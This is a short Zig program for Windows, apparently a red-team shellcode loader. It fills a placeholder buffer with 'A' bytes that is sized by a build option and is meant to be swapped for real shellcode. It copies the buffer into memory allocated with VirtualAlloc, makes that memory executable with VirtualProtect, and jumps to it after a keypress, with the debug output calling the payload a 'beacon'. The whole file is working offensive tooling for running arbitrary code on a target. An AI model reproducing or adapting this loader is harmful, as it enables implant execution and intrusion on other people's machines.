const std = @import("std");
const buildOptions = @import("build_options");

const MEM_COMMIT = 0x00001000;
const MEM_RESERVE = 0x00002000;
const PAGE_READWRITE = 0x04;
const PAGE_EXECUTE_READ = 0x20;

var DATA: [buildOptions.payloadSize]u8 = .{'A'} ** buildOptions.payloadSize;

fn allocateBeacon(shellcode: []u8) !*anyopaque {
    const pBeaconAllocation = std.os.windows.VirtualAlloc(null, shellcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) catch |err| {
        std.debug.print("[!] VirtualAlloc failed : {}\n", .{err});
        return err;
    };

    @memcpy(@as([*]u8, @ptrCast(pBeaconAllocation)), shellcode);

    var dwOldProtection: u32 = undefined;
    std.os.windows.VirtualProtect(pBeaconAllocation, shellcode.len, PAGE_EXECUTE_READ, &dwOldProtection) catch |err| {
        std.debug.print("[!] VirtualProtect failed : {}\n", .{err});
        return err;
    };

    return pBeaconAllocation;
}

pub fn main() void {
    std.debug.print("[+] Build option payload length: {d}\n", .{buildOptions.payloadSize});
    std.debug.print("[+] Data length: {d}\n", .{DATA.len});

    const beacon = allocateBeacon(&DATA) catch {
        std.debug.print("[!] allocateBeacon failed\n", .{});
        return;
    };

    std.debug.print("[+] Allocated beacon at {x}\n", .{beacon});

    const reader = std.io.getStdIn().reader();
    const x = reader.readByte() catch {
        return;
    };
    std.debug.print("{d}", .{x});

    const exec: *const fn () void = @ptrCast(@alignCast(beacon));
    exec();
}
